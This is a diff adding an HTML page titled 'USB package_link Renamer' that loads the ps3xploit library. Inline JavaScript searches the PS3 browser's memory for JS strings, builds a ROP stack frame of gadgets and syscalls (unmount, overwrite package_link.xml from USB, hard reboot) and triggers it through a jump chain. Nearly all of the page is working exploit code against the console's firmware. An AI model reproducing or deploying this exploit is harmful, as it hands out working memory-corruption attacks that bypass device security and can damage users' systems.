@@ -1,0 +1,319 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <script src="js/ps3xploit_v30.js"></script>
+    <title>xperiments - USB package_link Renamer</title>
+    <style>
+      body {
+        background-color: #fff;
+        text-align: center;
+        color: #0072ce;
+        padding-top: 128px;
+      }
+      button {
+        height: 64px;
+        margin-bottom: 24px;
+        font-size: 20px;
+        font-weight: bolder;
+        padding-left: 16px;
+        padding-right: 16px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      hr {
+        display: none;
+      }
+      h1 {
+        margin: 0;
+        padding: 0;
+      }
+      .icon {
+        width: 178px;
+        height: 178px;
+        display: inline-block;
+        -webkit-background-size: 178px 178px;
+      }
+      form {
+        text-align: center;
+      }
+    </style>
+    <script>
+      function downloadXml() {
+        document.getElementById('buttonsForm').action = '/download?rnd=' + new Date();
+        document.getElementById('btnROP').style.display = 'block';
+        document.getElementById('btnDOWN').style.display = 'none';
+      }
+
+      function preInitROP() {
+        document.getElementById('result').style.display = 'inline-block';
+        initROP(true);
+        document.getElementById('btnROP').style.display = 'none';
+        document.getElementById('btnDOWN').style.display = 'none';
+      }
+
+      function getdestFile() {
+        return 'package_link.downloaded';
+      }
+
+      function initROP(init) {
+        try {
+          if (init === true) {
+            frame_fails = 0;
+            search_base_off = 0;
+            search_size_ext = 0;
+          }
+          if (t_out !== 0) {
+            clearTimeout(t_out);
+            t_out = 0;
+          }
+          offset_array = [];
+          disable_all();
+          clearLogEntry();
+          store_idx_arr1 = new Array(1);
+          store_idx_arr2 = new Array(1);
+          xtra_data_addr = 0;
+          stack_frame_addr = 0;
+          jump_2_addr = 0;
+          jump_1_addr = 0;
+
+          var search_max_threshold = 70 * 0x100000; // 70Mb maximum memory search
+          var search_base = 0x80200000; //0x80190000;//
+          var search_size = 2 * mbytes;
+          search_base_off = 0 * mbytes;
+          search_size_ext = 2 * mbytes;
+          total_loops++;
+
+          // Overwrite filename and destination path here
+          template_1_file_usb = '/' + getdestFile();
+          template_1_file_blind = '/dev_usb000/package_link.xml';
+
+          xtra_data =
+            flash_partition.convert() +
+            filesystem.convert() +
+            mount_path.convert() +
+            getPath(template_1_file_usb).convert() +
+            fill_by_4bytes(0xc, dbyte00) +
+            template_1_file_blind.convert() +
+            make_dummy_xtra2() +
+            fill_by_16bytes(0x70, dbyte00) +
+            hexdw2bin(sp_exit) +
+            fill_by_8bytes(0x8, dbyte41) +
+            callsub(gadget12_addr, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0x80) +
+            syscall(sc_sm_shutdown, hard_reboot, 0, 0, 0, 0, 0, 0, 0) +
+            unescape('\uFD7E');
+          while (xtra_data_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check();
+              return;
+            }
+            xtra_data = xtra_data.replaceAt(0, hexh2bin(0x7efd));
+            xtra_data_addr = findJsVariableOffset('xtra_data', xtra_data, search_base, search_size);
+            search_max_threshold -= search_size;
+          }
+
+          flash_partition_addr = xtra_data_addr;
+          fs_addr = flash_partition_addr + flash_partition.convertedSize() - 0x4;
+          mount_path_addr = fs_addr + filesystem.convertedSize();
+
+          template_1_file_usb_addr = mount_path_addr + mount_path.convertedSize();
+          template_1_file_usbfd_addr = template_1_file_usb_addr + getPath(template_1_file_usb).convertedSize();
+          template_1_file_usb_readlen_addr = template_1_file_usbfd_addr + word_size;
+
+          template_1_file_blind_addr = template_1_file_usb_readlen_addr + dword_size;
+          template_1_file_blindfd_addr = template_1_file_blind_addr + template_1_file_blind.convertedSize();
+          template_1_file_blind_writelen_addr = template_1_file_blindfd_addr + word_size;
+          store_idx_arr1[0] = (template_1_file_blind_writelen_addr - flash_partition_addr + 0x8) / 2;
+
+          null_addr = template_1_file_blind_writelen_addr + dword_size + make_dummy_null_padding2() + dword_size;
+
+          store_idx_arr2[0] = (null_addr - flash_partition_addr + 0xc) / 2;
+          stat_addr = null_addr + dword_size * 0x3;
+          reboot_sf_addr = stat_addr + dword_size * 0xb;
+          //############################ Building stack frame ###############################################################
+          stack_frame =
+            stack_frame_hookup() +
+            syscall(sc_fs_umount, flash_partition_addr, fs_addr, mount_path_addr, 0, 0, 0, 0, 0) +
+            copy_file_overwrite(
+              template_1_file_usb_addr,
+              template_1_file_blind_addr,
+              template_1_file_usbfd_addr,
+              template_1_file_blindfd_addr,
+              template_1_file_buf_addr,
+              template_1_file_usb_readlen_addr,
+              template_1_file_blind_writelen_addr,
+              stat_addr,
+              null_addr,
+              null_addr + 0x8
+            ) +
+            optional_reboot1(reboot_sf_addr, template_1_file_blind_writelen_addr) +
+            stack_frame_exit();
+          //############################ End stack frame ###############################################################
+
+          while (stack_frame_addr === 0) {
+            if (search_max_threshold < search_size + search_size_ext) {
+              frame_fails++;
+              if (frame_fails % 10 === 0) {
+                search_base_off += 0;
+                search_size_ext += 0;
+              }
+              load_check();
+              return;
+            }
+            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2a2f));
+            stack_frame_addr = findJsVariableOffset(
+              'stack_frame',
+              stack_frame,
+              search_base + search_base_off,
+              search_size + search_size_ext
+            );
+            if (stack_frame_addr == -1)
+              if (search_max_threshold < search_size + search_size_ext) {
+                frame_fails++;
+                load_check();
+                return;
+              }
+            search_max_threshold -= search_size + search_size_ext;
+          }
+          jump_2 =
+            unescape('\u0102\u7EFB') + fill_by_16bytes(0x30, dbyte41) + hexw2bin(stack_frame_addr) + unescape('\uFB7E');
+          while (jump_2_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check();
+              return;
+            }
+            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7efb));
+            jump_2_addr = findJsVariableOffset('jump_2', jump_2, search_base, search_size);
+            if (jump_2_addr == -1)
+              if (search_max_threshold < search_size) {
+                load_check();
+                return;
+              }
+            search_max_threshold -= search_size;
+          }
+          jump_1 = unescape('\u4141\u7EFA') + hexw2bin(jump_2_addr) + unescape('\uFA7E');
+          while (jump_1_addr === 0) {
+            if (search_max_threshold < search_size) {
+              load_check();
+              return;
+            }
+            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7efa));
+            jump_1_addr = findJsVariableOffset('jump_1', jump_1, search_base, search_size);
+            if (jump_1_addr == -1)
+              if (search_max_threshold < search_size) {
+                load_check();
+                return;
+              }
+            search_max_threshold -= search_size;
+          }
+          var sf = checkMemory(stack_frame_addr - 0x4, 0x10000, stack_frame.length);
+          var x = checkMemory(xtra_data_addr - 0x4, 0x2000, xtra_data.length);
+          var j2 = checkMemory(jump_2_addr - 0x4, 0x800, jump_2.length);
+          var j1 = checkMemory(jump_1_addr - 0x4, 0x800, jump_1.length);
+          if (j2 === jump_2 && j1 === jump_1 && x === xtra_data && sf === stack_frame) {
+            if (t_out !== 0) {
+              clearTimeout(t_out);
+            }
+            showResult(
+              '<h1><b><font color=%22386E38%22>USB package_link Renamer initialized successfully.</font></b></h1>'
+            );
+            enable_element(document.getElementById('btnTrigger'));
+            document.getElementById('btnTrigger').focus();
+            triggerX();
+          } else {
+            if (x !== xtra_data) logAdd('xtra_data mismatch in memory!');
+            if (sf !== stack_frame) logAdd('stack_frame mismatch in memory!');
+            if (j2 !== jump_2) logAdd('jump_2 mismatch in memory!');
+            if (j1 !== jump_1) logAdd('jump_1 mismatch in memory!');
+            //logAdd("String mismatch in memory!");
+            load_check();
+          }
+        } catch (e) {
+          debug = true;
+          logAdd(
+            br +
+              'USB package_link Renamer initialization failed because the following exception was thrown during execution:' +
+              br +
+              e +
+              ' at : ' +
+              e.lineNumber
+          );
+          debug = false;
+        }
+      }
+
+      function triggerX() {
+        clearLogEntry();
+        showResult("<h2><b><span style='color:#000000;'>Renaming package_link file</span></b></h2>");
+        disable_all();
+        setTimeout(trigger, 1000, jump_1_addr);
+        setTimeout(
+          rop_exit_1val,
+          2000,
+          '<h1><b><font color=%22386E38%22>USB package_link rename succeeded!</font></span></b></h1>',
+
+          "<h1><b><font color='red'>USB package_link Renamer failed!</font></b></h1><h3><b><span style='color:#000000;'>Error copying file(s):</span></b></h3>",
+          "<h3><b><span style='color:#000000;'>" + getdestFile() + ' to ' + template_1_file_blind + '</span></b></h3>'
+        );
+        cleanGUI();
+      }
+    </script>
+  </head>
+
+  <body id="bodyId">
+    <div class="icon" style="background-image: url(/img/net-connect.png)"></div>
+    <h1 style="padding-bottom: 32px;">Download Package Link</h1>
+    <p style="display: none;">
+      <select name="dpath" id="combodestFile" onchange="getdestFile();" style="display: none;">
+        <option value="SCE-PS3-CP-R-KANA.TTF">package_link.xml</option>
+      </select>
+      <span style="color:#000000"><b>Root Path</b> </span>
+      <select id="combofilePath" name="fPath" size="1" onchange="selectfilePath()" disabled="">
+        <option id="usb_0" selected="selected" value="/dev_usb000">/dev_usb000</option>
+        <option id="usb_1" value="/dev_usb001">/dev_usb001</option>
+        <option id="usb_6" value="/dev_usb006">/dev_usb006</option>
+        <option id="xploit_extras" value="/dev_hdd0/game/PS3XPLOIT/USRDIR/extras"
+          >/dev_hdd0/game/PS3XPLOIT/USRDIR/extras</option
+        >
+        <option id="han_toolbox" value="/dev_hdd0/game/HANTOOLBX/USRDIR/files/"
+          >/dev_hdd0/game/HANTOOLBX/USRDIR/files/</option
+        >
+      </select>
+      | Auto-Close Browser
+      <input type="checkbox" id="auto_close" name="aclose" onclick="autoclose();" disabled="" /> | Auto-Reboot
+      <input type="checkbox" id="auto_reboot" name="areboot" checked="checked" onclick="autoreboot();" disabled="" />
+      <span id="dex_txt" style="visibility:hidden">
+        | DEX mode<input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"
+      /></span>
+    </p>
+    <form id="buttonsForm" method="GET" action="/download">
+      <button id="btnROP" type="button" onclick="preInitROP();" style="display: none">
+        Rename & Reboot
+      </button>
+      <button id="btnDOWN" type="submit" onclick="downloadXml()">
+        Download updated package_link
+      </button>
+      <button id="btnTrigger" disabled="" type="button" onclick="triggerX();" style="display: none">
+        Rename & Reboot
+      </button>
+
+      <span id="reset" style="display:none">
+        <button id="btnReset" type="button" onclick="disable_trigger();">
+          Reset
+        </button>
+      </span>
+    </form>
+
+    <div
+      id="result"
+      style="-webkit-border-radius: 15px; background-color: #ccc; padding: 24px; width: 600px; display: none;"
+    ></div>
+    <br />
+    <div id="log"></div>
+    <div id="exploit"></div>
+    <div id="trigger"></div>
+    <div id="footer"></div>
+    <script>
+      ps3chk();
+    </script>
+  </body>
+</html>
